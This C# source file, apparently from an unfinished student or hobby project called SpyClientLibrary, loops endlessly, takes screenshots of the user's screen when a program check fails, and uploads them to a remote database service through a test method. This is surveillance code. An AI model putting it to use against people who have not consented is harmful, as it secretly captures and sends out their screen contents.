using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SpyClientLibrary.ServiceReference;
using System.Drawing;


namespace SpyClientLibrary
{
    public class Control
    {
        public TaskManager _taskmanager { get; set; }
        public User _user { get; set; }
        public Control()
        {

        }
        public void StartControl()
        {
            _user = new User();
            _taskmanager = new TaskManager();
            while(true)
            {
                if (!_taskmanager.CheckOpenPrograms())
                {
                    ScreenShot screen = new ScreenShot(_user);
                    screen.GenerateCurrentScreen();
                    SendScreeen(screen);
                }
            }
        }
        public void SendScreeen(ScreenShot screen)
        {
         
        }
        public void SendScreenTest()
        {
            using (ClientServiceClient client = new ClientServiceClient())
            {
                ScreenShot screen = new ScreenShot(_user);
                screen.GenerateCurrentScreen();
                var response = client.SaveScreenShotToDB(
                        new ClientRequest()
                        {
                            //_username = screen._user._userName,
                            _scrrenDate = screen._scrrenDate,
                            _scrrenName = screen._screenName,
                            _data = screen._data
                        });
                var a = 0;

            }
        }
        public void GetScreenTest()
        {
            using (ClientServiceClient client = new ClientServiceClient())
            {
                var response = client.GetScreenFromDB();
                Image tosave =ScreenShot.byteArrayToImage(response);
                tosave.Save("C:\\Users\\Michał\\Desktop\\nowy.png");
                
            }
        }
    }
}
